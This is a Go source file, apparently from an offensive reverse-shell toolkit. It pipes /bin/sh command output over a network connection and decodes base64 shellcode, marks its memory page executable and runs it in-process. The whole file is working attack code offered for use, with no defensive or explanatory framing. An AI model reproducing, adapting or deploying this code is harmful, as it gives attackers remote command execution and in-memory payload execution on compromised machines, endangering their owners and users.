// +build linux darwin freebsd !windows

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

// GetShell returns an *exec.Cmd instance which will run /bin/sh
func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

// ExecuteCmd runs the provided command through /bin/sh
// and redirects the result to the provided net.Conn object.
func ExecuteCmd(command string, conn net.Conn) {
	cmdPath := "/bin/sh"
	cmd := exec.Command(cmdPath, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// InjectShellcode decodes base64 encoded shellcode
// and injects it in the same process.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			ExecShellcode(shellcode)
		}
	}
	return
}

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

// ExecShellcode sets the memory page containing the shellcode
// to R-X, then executes the shellcode as a function.
func ExecShellcode(shellcode []byte) {
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := getPage(shellcodeAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	shellPtr := unsafe.Pointer(&shellcode)
	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
	go shellcodeFuncPtr()
}
